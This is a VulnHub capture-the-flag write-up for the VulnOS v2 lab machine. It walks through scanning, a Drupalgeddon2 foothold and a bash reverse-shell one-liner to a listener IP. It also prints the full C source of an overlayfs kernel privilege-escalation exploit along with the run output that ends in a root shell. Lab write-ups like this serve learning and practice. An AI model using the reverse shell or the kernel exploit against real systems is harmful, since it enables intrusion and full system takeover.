### Part 1: Enumeration

I started with nmap scan:

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/1.png)

Port 22 and 80 are open, i started with http, it was hosting this website

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/2.png)

After clicking on website i got redirected to jabc company website

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/3.png)

I fired up dirsearch and found many interesting directories in this site

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/4.png)

from the directories result, i suspected it was using drupal, so i ran whatweb and found out it was using old version of drupal which was vulnerable to many exploits:

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/5.png)

### Part 2: Foothold

##### searchsploit result:

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/6.png)

then, i fired up metasploit and used `exploit/unix/webapp/drupal_drupalgeddon2` module and got a shell

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/7.png)

i used this bash oneliner to get more interactive shell: `bash -c 'bash -i >& /dev/tcp/192.168.36.21/3669 0>&1'`

then i searched for user with loginshell:

```
www-data@VulnOSv2:/var/www/html/jabc$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash
postgres:x:107:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

### Part 3: root

I found out it was using vulnerable Linux kernel

```
uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
```

which was vulnerable to 'overlayfs'-local privilege escalation.

Copy this codeblock in file with '.c' extension, eg: a.c

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}

```

then after running these command i got root shell

```
www-data@VulnOSv2:/tmp$ gcc a.c -o ofs
gcc a.c -o ofs
www-data@VulnOSv2:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@VulnOSv2:/tmp$ ./ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root
```

![NMAP](/static/writeups/VulnHub/VulnOS-V2.md/8.png)

I got root like this.
